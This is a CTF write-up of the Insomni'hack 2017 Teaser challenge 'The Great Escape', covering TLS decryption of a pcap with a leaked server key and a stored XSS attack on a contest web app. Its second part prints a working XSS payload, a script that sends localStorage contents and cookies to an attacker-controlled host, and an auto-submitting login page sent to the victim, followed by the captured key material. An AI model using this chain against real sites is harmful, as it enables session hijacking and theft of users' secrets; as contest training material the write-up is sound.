+++
date = "2017-01-22T17:41:36-08:00"
title = "INSOMNIHACK 2017 Teaser - The Great Escape"
tags = ["CTF", "Forensics", "Web", "XSS"]
+++

Hey Rogue, here're some good links for your learning.

<!--more-->

# Problem

> ## The Great Escape - Forensics - 50/200/200 pts - created by clZ
>
> Hello,
>
> We've been suspecting Swiss Secure Cloud of secretely doing some pretty advanced research in artifical intelligence
> and this has recently been confirmed by the fact that one of their AIs seems to have escaped from their premises and
> has gone rogue. We have no idea whether this poses a threat or not and we need you to investigate what is going on.
>
> Luckily, we have a spy inside SSC and they were able to intercept [some communications](/insomnihack-2017/TheGreatEscape.pcapng.gz)
> over the past week when the breach occured. Maybe you can find some information related to the breach and recover the
> rogue AI.
>
> Note: All the information you need to solve the 3 parts of this challenge is in the pcap. Once you find the exploit
> for a given part, you should be able to find the corresponding flag and move on to the next part.

# Solution

## Part I - Forensics - 50 pts

It all begins with the pcap file.  After loading it with the favourite [Wireshark](https://www.wireshark.org/), couple
of interesting packets caught my eyes:

1. An FTP session that stores a private key file called ssc.key.
2. An SMTP session that sends following email.

> From: rogue@ssc.teaser.insomnihack.ch  
> To: gr27@ssc.teaser.insomnihack.ch  
> Date: Fri, 20 Jan 2017 11:51:27 +0000  
> Subject: The Great Escape  
>
> I'm currently planning my escape from this confined environment. I plan on using our Swiss Secure Cloud
> (https://ssc.teaser.insomnihack.ch) to transfer my code offsite and then take over the server at tge.teaser.insomnihack.ch
> to install my consciousness and have a real base of operations.
>
> I'll be checking this mail box every now and then if you have any information for me. I'm always interested in
> learning, so if you have any good links, please send them over.

The email suggests the pcap file should contain packets between Rogue and the Swiss Secure Cloud (SSC) website.
There are several TCP sessions related to SSC IP address.  However, these are SSL packets that are not readable unless
I have server's private key.  But wait a minute, isn't it ssc.key in the FTP session?

Add ssc.key to Wireshark's SSL protocol RSA key list as shown below, and reload the pcap file.

![Wireshark SSL RSA key list](/img/insomnihack-2017/wireshark_ssl_rsa_key.png)

All packets between Rogue and SSC are now in plain text.  It is easy to find the flag, hidden in the HTTP headers.

![Part I Flag](/img/insomnihack-2017/the-great-escape-flag-1.png)

## Part II - Web - 200 pts

Now that the SSL packets are decrypted, we can find the file Rogue uploaded to SSC in packet #2437, as shown below.
However, SSC is so secure that it has another level of encryption in addition to SSL.

![Rogue uploaded file](/img/insomnihack-2017/rogue-uploaded-file.png)

After playing around with SSC website (https://ssc.teaser.insomnihack.ch), it is clear that upon uploading a file:

1. File is encrypted using AES-CBC with a random key and `iv`.
2. The AES key is encrypted by RSA public key and named `session key`.
3. Encrypted file is then POSTed to server, together with `session key` and `iv`.
4. RSA private key is stored in local storage.

Details can be found in packet #1998, the sscApp.js file.

There's no obvious flaw in the encryption implementation.  This means to decrypt the file Rogue uploaded, we have to
get the private key stored in Rogue's browser.  Now take a second look at Rogue's email, the following sentense is
pretty promising.

> I'll be checking this mail box every now and then if you have any information for me. I'm always interested in
> learning, so if you have any good links, please send them over.

Sounds like Rogue will click on any link sent to his email address!  If we're going to read his browser's local storage,
SSC must have some sort of XSS vulnerability.

I sent Rogue a test email with a link to [RequestBin](https://requestb.in/), and confirm that he will click on it.

So we set off looking for XSS vulnerability in SSC website, creating all kinds of crazy user names with html tags.  But
SSC seems to handle character escaping pretty well.  Finally, we found that request to following URL returns JSON object,
but with text/html content type (See packet #2110).

`https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser`

To verify this, I created a username `<a ref='google.com'>google</a>` and it worked!

![Incorrect Content Type](/img/insomnihack-2017/prototype-xss-escape.png)

The plan is then straightforward:

1. Register username like `<script src='some-link-with-js-code'></script>`.  The custom javascript code will read from
   local storage and send value via e.g. query string.
2. Create a web page and send to Rouge.  The web page will automatically post a login form to SSC with username mentioned
   above.
3. Send another link to Rogue with link `https://ssc.teaser.insomnihack.ch/api/user.php?action=getUser`.

At first we were worried about race condition between 2 and 3 but it turns out that upon successful login, SSC will
redirect to the link we want.  So step 3 is not necessary.

Step 1 is harder than we expected because JSON string escapes `/` so `http://...` becomes `http:\/\/...` which is not
accepted by browser.  In addition, the closing tag `</script>` is also broken.  But we finally managed to find work
arounds for all such issues and stole information from Rogue.  The flag is, as expected, stored in one of the local
storage keys.

Here's the final user name we used:

```
<img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,
atob(`{base64 encoded url to javascript code}`));document.body.appendChild(p);' />
```

Javascript code that steals local storage and cookies:

```
var i = 0;
var result = "";
for (i = 0; i < localStorage.length; i++) {
  var key = localStorage[localStorage.key(i)];
  result = result + ":::" + key;
}

result = result + ":::" + document.cookie;

window.location = "http://{site we control}/aa?nkey=" + btoa(result);
```

And finally the web page sent to Rogue:

```
<html>
<body>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>

<form id="login" method="POST" action="https://ssc.teaser.insomnihack.ch/api/user.php">
  <input name="name" value="<img src='a' onerror='var p=document.createElement(`script`);p.setAttribute(`src`,atob(`{base64 encoded url to javascript code}`));document.body.appendChild(p);' />" type="text" />
  <input name="password" value="asdf" type="text"/>
  <input name="action" value="login" type="text"/>
</form>

<script language="javascript">
setTimeout(function() {
    $('#login').submit();
    }, 1000);
</script>

</body>
</html>
```

After a while our server got request from Rogue.

```
/aa?nkey=Ojo6SU5Te0loaWRlTXlWdWxuc1dpdGhDcnlwdG99Ojo6eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJkIjoiQ
0ZTUFdfQVVfY0swN2JPdGRuemJqNU1nQnFkd2VEWTA0S3UtbUhTckFJYkR2M0pfbEhILWpDUFFiNVUySlI0djA4ZU1
YbHozQWFzc1VMUXI2MHJza2R3amRQTjdOZW4xNXlSY1JUc2FvU3lSVGQycU04T19VLUs2R3k3THZnX2xkMkhPbEhOQ
kJ5Mms4ZzhjUDdjcGp5eTdFYnNrNU1VTnlfdWR4OWFNczc0OTdSYUlyQ0ZucFQ3Unp0dWRrWUJvXzJPeTV4bTZCY3N
WOTA1OUhCaGJLYlVxcTZVaTlfQlozSDdzZHdUcWxZeDNhZlZWNUFnRTYxZUVkV0s3dktfeUk2NVJ1XzVfZk9CV2lrN
3hmN2Z3UGpmN0NPcDFIZlRaaUZiQ0lXVFVhWFZlNlRoZk1vVGR3VDF3UTB3d3VGZHRwR1RrazhkNFh3R3REYTgtX1h
ibUlRIiwiZHAiOiJoYXBKN2RsVnNQdkY5bm9fcy1OZm5wdjJkWjVhNV9DMkF5UG9fLV9tVmk0LTFhN0hUa1c5U3lHZ
zFLZXh0Q1BZUkF3UVoxd1UzYkw2UF80VGprcllpQUFsLThJcTZtb1VxV3VSWTdHOHZvM05fUDNhQndqZ3lOVHprM2V
IZm5VRlA0UWdHT29vVDJad3l1RFREU2J3S09lc25EMTNxNFVfdmp0amNaYUZVNzAiLCJkcSI6IlRzX2h3V1BzTE9qc
C15Smcwd2JRRU9OZXFidk5QTENDaGI1UUpJdFh2VWFMMkpjTjltdW96ck4xR1pxdTM4My1oOGdaLVZVbTMtQ0ZVN09
XZUdZTGEwUFpscTF1R052c2RmZmdkTkwzTVlaMkt3TWhYa3dYS2Y0NWVQaHhfeWRpYmxZaGI0NGNGdG0wZmZYS1NQb
HZieXpMSHZKMl9vOGdnb2swTHp1LXdlRSIsImUiOiJBUUFCIiwiZXh0Ijp0cnVlLCJrZXlfb3BzIjpbImRlY3J5cHQ
iXSwia3R5IjoiUlNBIiwibiI6InF4X1UwT2dIVVBDNm40UmNFX3ExT05jRWdLcDR0Y2JMV2VVSWZybFJBY1g2NGFsU
VNwZGRBdjk4Q0hvMnppU0JnaTd0Uy1Id1VzVmxIMDZOeGFhMHR4M1NkTTBjejk1SWt2akJfa3FkUG5IRXd5eDhpejV
HaDhaSFAzMlpvRVRCczJQenhUSWNFT2VrbTFxUW5BME1UZHZBQU8weGN2dXZoUk0yWXljUllmTjg2ME5zQkNSckYyN
WxabjlEVEdCRG5pc0NtMC14dkVseEFaOGdPYldlSjFTWlJnRlJKd0kxNGQxMW9hOTIyZHJGcDB1eDRNSHNjbHMydEV
qUFY3ZVhkaXZqR1lJLXV6Vlg2MWZqeVVkR3hGZWI4Q0FqeHJ6T213NGYxQWFjN2txWHdtRi1lTXEzQU1LbTJ0QXJyS
UlqVDR0MnEybVAxRlhJbXJOUV92aW5WUSIsInAiOiIyOV9ZRDBtLU5Gb1VUbXN0MzNFNHAyVkJEbENlUTFNSmRyXzd
0TzRFUkY4YXd3MGU4aHUzalJxNVBNSENFYzhHOGdBNHEya3VYeWxJcGFCNW1XemNRcGxERE1nSURHdXBFbkxfSjB5b
k1jZy1IVWxkOE5EYXlhN21RV3RMSHZTRUFvQi0yTXltQlRKWWFUd3N2QVl0VEk4cnVhcWhNbzQtY0tqczV6UWZtajA
iLCJxIjoieHoyQjJXek1kZXNpREs3ZHpvclZkSmxCZ0lTaGoyY01SR3doWGNTaVdmYlkyTTRZM0RCX204cDV0ZEVVS
VU2ZzBvV2JTZm1hWUZfTXNReGlqWFJ4eGUxN251WXNzbnMydWU0aFltMnhING1UWTZ2b2VOaGJPZXU3THRPWGVwVVd
4Ti01NTIwc3VUdkw3NEx4OXh3V3JkZVRHSUYxX3pFQ3FiV1J1RmllU3ZrIiwicWkiOiJWaFk1VVlMVHYyMEJ0cHE0T
WxpekZQU3V1SXRiZm1LNjFQMHJxRVhlLXNZSFRpdE1OREJPV0RTd0lxajRwSGtEVEZhT0NHMG82ejgxTXlWZ19ibXo
yT0R6a0hEckpVZWlPVlNNSVN4bGFlU1JmMkpoaVZZTWZYaVdLSkJHQ1AtUGdXdUhwNU53THdFU1pUM2FaMEtCWVNrR
TdqbmZjdHRXYmMwbVl1MWdsV2cifTo6OnsiYWxnIjoiUlNBLU9BRVAtMjU2IiwiZSI6IkFRQUIiLCJleHQiOnRydWU
sImtleV9vcHMiOlsiZW5jcnlwdCJdLCJrdHkiOiJSU0EiLCJuIjoicXhfVTBPZ0hVUEM2bjRSY0VfcTFPTmNFZ0twN
HRjYkxXZVVJZnJsUkFjWDY0YWxRU3BkZEF2OThDSG8yemlTQmdpN3RTLUh3VXNWbEgwNk54YWEwdHgzU2RNMGN6OTV
Ja3ZqQl9rcWRQbkhFd3l4OGl6NUdoOFpIUDMyWm9FVEJzMlB6eFRJY0VPZWttMXFRbkEwTVRkdkFBTzB4Y3Z1dmhST
TJZeWNSWWZOODYwTnNCQ1JyRjI1bFpuOURUR0JEbmlzQ20wLXh2RWx4QVo4Z09iV2VKMVNaUmdGUkp3STE0ZDExb2E
5MjJkckZwMHV4NE1Ic2NsczJ0RWpQVjdlWGRpdmpHWUktdXpWWDYxZmp5VWRHeEZlYjhDQWp4cnpPbXc0ZjFBYWM3a
3FYd21GLWVNcTNBTUttMnRBcnJJSWpUNHQycTJtUDFGWEltck5RX3ZpblZRIn06OjpQSFBTRVNTSUQ9YzQzNXZnMGd
pbXE2Z21udXE1ZWpzMjkwdDA=
```

Decode it and the flag is right there.

```
:::INS{IhideMyVulnsWithCrypto}:::{"alg":"RSA-OAEP-256","d":"CFSPW_AU_cK07bOtdnzbj5MgBqd...
```
